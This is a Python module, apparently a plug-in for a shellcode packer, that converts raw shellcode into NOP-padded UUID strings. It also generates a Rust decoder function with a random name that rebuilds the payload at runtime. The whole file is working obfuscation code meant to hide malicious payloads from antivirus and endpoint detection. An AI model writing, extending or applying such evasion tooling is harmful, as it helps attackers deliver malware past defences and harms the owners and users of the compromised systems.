import random
import string
from uuid import UUID

class UUIDEncode:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return ['extern crate uuid;', 'use uuid::{Uuid};']

    def compilerOptions(self) -> list[str]:
        return ['uuid = "1.24.0"']

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = len(decoded)
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(str(UUID(bytes = chunk)))
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}(&{{shellcode}})')

    def codeblock(self) -> str:
        return f"""
fn {self.name}(encoded: &Vec<String>) -> Vec<u8> {{
    let mut decoded = vec![0; {self.size}];
    for (i, uuidstring) in encoded.iter().enumerate(){{
        let  binaryuuid = Uuid::parse_str(uuidstring);
        for (j, uuidbyte) in binaryuuid.unwrap().as_bytes().iter().enumerate(){{
            if i*16+j >= {self.size}{{
                return decoded.to_vec()
            }}
            decoded[i*16+j] = *uuidbyte;
        }}
    }}
    decoded
}}
"""